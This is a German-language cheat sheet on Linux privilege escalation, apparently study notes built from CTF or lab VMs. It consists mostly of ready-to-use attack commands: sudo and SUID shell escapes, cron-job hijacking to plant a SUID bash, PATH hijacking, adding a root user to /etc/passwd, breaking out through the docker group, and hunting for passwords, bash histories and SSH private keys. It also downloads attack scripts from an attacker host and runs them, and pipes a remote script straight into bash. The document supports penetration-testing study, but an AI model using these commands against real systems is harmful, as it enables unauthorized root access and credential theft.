# 🐧 Linux Privilege Escalation

## 0. Erstmal Übersicht (immer!)

```bash
# Wer bin ich?
id
whoami
groups
hostname
uname -a
cat /etc/os-release

# Wo bin ich?
pwd
ls -la

# Andere User?
cat /etc/passwd | grep -v nologin | grep -v false
ls /home/

# Was läuft?
ps auxf
ss -tulnp
netstat -tulnp
```

## 1. Automatisiert

```bash
# Auf Angreifer
python3 -m http.server 8000

# Auf Target
cd /tmp
wget http://$LHOST:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh | tee linpeas.out
wget http://$LHOST:8000/lse.sh && chmod +x lse.sh && ./lse.sh -l 2

# Direkt aus dem Netz
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

## 2. Sudo-Rechte (häufigster Win!)

```bash
sudo -l                                   # was darf ich als sudo?
sudo -l -l                                # detaillierter
```

→ Ergebnis bei [GTFOBins](https://gtfobins.github.io/) checken.

```bash
# Beispiele
sudo /usr/bin/find . -exec /bin/sh \; -quit
sudo /usr/bin/vim -c ':!/bin/sh'
sudo /usr/bin/less /etc/profile          # !/bin/sh
sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
sudo /usr/bin/perl -e 'exec "/bin/sh";'

# sudo mit env_keep
sudo LD_PRELOAD=/tmp/evil.so cmd
```

### Unbeschränktes sudo (ALL : ALL)

Der einfachste Fall — wenn der User `(ALL : ALL) ALL` darf:

```bash
sudo su -          # direkt root
sudo -i
sudo bash
```

> **Lab-Beispiel VM1 (django) & VM8 (alpha):** Beide hatten `(ALL : ALL) ALL`.
> `sudo su` mit bekanntem User-Passwort → sofort root.
> Häufigster und langweiligster, aber zuverlässigster Win.

### ⚠️ sudo-Wildcard in beschreibbarem Verzeichnis

Gefährliches Muster: User darf per sudo etwas in einem Verzeichnis ausführen,
auf das er **selbst Schreibrechte** hat — via Wildcard `*`.

```bash
sudo -l
# User mrderp may run the following commands:
#   (ALL) /home/mrderp/binaries/derpy*
```

Da `derpy*` matcht und `~/binaries` beschreibbar ist → eigenes Skript einschleusen:

```bash
mkdir -p ~/binaries
cat > ~/binaries/derpyroot.sh << 'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x ~/binaries/derpyroot.sh
sudo ~/binaries/derpyroot.sh      # → root-Shell
```

> **Lab-Beispiel VM2 (mrderp):** Genau dieses Muster. Die Wildcard erlaubt
> jeden Dateinamen, der mit `derpy` beginnt — also legt man einfach sein eigenes
> `derpyroot.sh` ab und führt es mit sudo aus.
> **Merke:** Wildcard + writable dir in sudoers = trivialer Root.

## 3. SUID-Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -o -perm -g=s -type f 2>/dev/null      # SUID + SGID
```

→ Jedes ungewöhnliche Binary bei [GTFOBins](https://gtfobins.github.io/) checken.

### SUID auf Standard-Tools — die wichtigsten Eskalationen

```bash
# nmap (ALTE Versionen mit interaktivem Modus!)
nmap --interactive
nmap> !sh                          # Shell mit den Rechten des Datei-Owners (root)

# find
./find . -exec /bin/sh -p \; -quit

# vim / vim.basic
./vim -c ':py3 import os; os.execl("/bin/sh","sh","-pc","reset; exec sh")'

# bash (SUID-Bit gesetzt)
./bash -p                          # -p behält die effektiven Rechte

# python
./python -c 'import os; os.setuid(0); os.system("/bin/sh")'

# cp / mv / nano / less / more / awk → alle bei GTFOBins nachschlagen
```

> **Lab-Beispiel VM3 (MrRobot):** `nmap` lag als SUID-root vor — und zwar eine
> uralte Version (3.81) **mit** interaktivem Modus. `nmap --interactive` →
> `!sh` ergab direkt eine Root-Shell. Der interaktive Modus wurde in neueren
> Versionen entfernt, taucht aber in CTF-/Prüfungs-VMs ständig auf.

### SUID-Bash aus gekapertem Cronjob (Persistenz-Trick)

Wenn ein als root laufendes Skript beschreibbar ist (siehe Punkt 5), legt man
sich oft eine SUID-Bash an, statt direkt eine Shell zu spawnen:

```bash
# Im writable root-Cronjob hinterlegen:
cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash
# Nach Cron-Lauf:
/tmp/rootbash -p          # -p = effektive (root-)Rechte behalten
```

> **Lab-Beispiel VM1:** Cronjob `/etc/cron.d/runAV` rief ein für alle
> beschreibbares Python-Skript als root auf. Inhalt ersetzt durch SUID-Bash-Payload
> → nach dem nächsten Lauf `rootbash -p` → root.
> **Lab-Beispiel VM16:** Nach Trigger der XZ-Backdoor wurde `chmod u+s /bin/bash`
> als root gesetzt → `/bin/bash -p` → root.

## 4. Capabilities

```bash
getcap -r / 2>/dev/null

# Beispiel: cap_setuid auf python
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

## 5. Cronjobs

```bash
# System-Cron
cat /etc/crontab
ls -la /etc/cron.*
ls -la /etc/cron.d/
ls -la /var/spool/cron/

# WICHTIG: Berechtigungen der aufgerufenen Skripte prüfen!
ls -la /pfad/zum/cron-skript.sh
# Wenn -rwxrwxrwx (world-writable) und läuft als root → Jackpot

# Beobachten was läuft (pspy = Goldgrube)
# pspy zeigt Prozesse OHNE root-Rechte
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64 && ./pspy64
```

Wenn ein Cron-Skript schreibbar ist → eigenen Code reinpacken (SUID-Bash, siehe Punkt 3).

## 6. PATH Hijacking

```bash
# Schreibbare Verzeichnisse im PATH?
echo $PATH
# Wenn z.B. /tmp im PATH und ein Skript ruft "ls" ohne absoluten Pfad auf:
echo '#!/bin/bash
/bin/sh' > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
```

## 7. Schreibbare Files

```bash
# Schreibbare /etc/passwd?
ls -la /etc/passwd
# Wenn writable:
openssl passwd -1 -salt x newpass
# → newroot:HASH:0:0:root:/root:/bin/bash

# Schreibbare sudoers?
ls -la /etc/sudoers /etc/sudoers.d/

# Schreibbare /etc/shadow?
```

## 8. Hardcodierte Credentials in Binaries / Dateien

Bevor man Kernel-Exploits anfasst: nach Passwörtern suchen, die irgendwo
hartcodiert oder abgelegt sind.

```bash
# strings auf jede ungewöhnliche (SUID-/Custom-)Binary
strings /pfad/zur/binary | grep -i -E 'pass|pwd|user|key'
strings -n 8 binary

# Klartext-Notizen / abgelegte Passwörter
cat ~/Documents/notes.txt 2>/dev/null
find /home -iname "*.txt" 2>/dev/null | xargs grep -il pass 2>/dev/null
find / -iname "notes*" -o -iname "*password*" 2>/dev/null
```

> **Lab-Beispiel VM1:** `strings customPermissionApp` enthielt das
> django-Passwort (über Zeilen verteilt) → horizontale Eskalation.
> **Lab-Beispiel VM8:** `cat Documents/notes.txt` enthielt `Alpha_P@ssw0rd!`
> im Klartext.
> Details/Tools → [Steganografie & versteckte Credentials](../../99-Resources/steganography.md)

## 9. Kernel Exploits (letzter Ausweg, kann crashen!)

```bash
uname -a
cat /etc/os-release
# → searchsploit / google nach passendem Exploit

# Klassiker
# - DirtyCow (CVE-2016-5195) — Kernel < 4.8
# - Dirty Pipe (CVE-2022-0847) — Kernel 5.8 - 5.16.11
# - PwnKit (CVE-2021-4034) — pkexec, fast überall
# - sudo Baron Samedit (CVE-2021-3156)

# linux-exploit-suggester
./linux-exploit-suggester.sh
```

## 10. Docker / LXD

```bash
# In docker-Gruppe?
id
# Ja → root übernehmen:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# In lxd-Gruppe?
# Image vorbereiten und Mount → root
```

## 11. NFS no_root_squash

Wenn auf Mount geschrieben werden kann mit no_root_squash → SUID-Binary von Angreifer-Maschine reinlegen.

## 12. Weak Service Files

```bash
# systemd-Services prüfen
systemctl list-units --type=service
ls -la /etc/systemd/system/
# Wenn ein Service-File writable → ExecStart=/tmp/shell.sh
```

## 13. Credentials suchen

```bash
# Klassiker
grep -ri "password" /etc/ 2>/dev/null
grep -ri "passwd" /etc/ 2>/dev/null
find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null

# Bash History
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null

# Backup-Files
find / -name "*.bak" 2>/dev/null
find / -name "*.old" 2>/dev/null

# SSH Keys (auch world-readable private keys!)
find / -name "id_rsa*" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
ls -la /home/*/.ssh/                     # private key mit 644 = lesbar für alle!

# Datenbank-Files
find / -name "*.kdbx" 2>/dev/null
find / -name "*.sqlite" 2>/dev/null
```

> **Lab-Beispiel VM8:** Privater SSH-Key lag mit Leserechten für alle
> (`-rw-r--r--`) → in Kombination mit dem Duplicator-File-Read von außen
> auslesbar und für direkten Login nutzbar.

## 📝 Wichtige Resources

- [GTFOBins](https://gtfobins.github.io/) — Standardlookup für SUID/sudo
- [HackTricks Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
